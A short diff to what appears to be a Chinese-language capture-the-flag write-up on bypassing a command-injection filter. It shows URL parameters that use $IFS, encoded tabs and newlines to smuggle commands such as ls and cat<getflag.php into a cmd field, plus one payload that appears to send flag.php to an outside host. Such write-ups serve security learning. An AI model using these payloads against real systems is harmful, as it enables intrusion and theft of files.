@@ -29,3 +29,11 @@ echo $IFS   | od -b
     
     我发现的:$cmd=$IFS\-x$IFS\wonderkun.cc$IFS\-T$IFS\flag.php$IFS\http
     
+---
+另一种做法可以绕过过滤 : 
+?num=0.99999999999999999&cmd=$1%09file://$PWD/getflag.php%0a1
+
+---
+还有再来一种做法 : 
+?num=0.99999999999999999&cmd=0%0als%0a0
+?num=0.99999999999999999&cmd=0%0acat<getflag.php%0a0
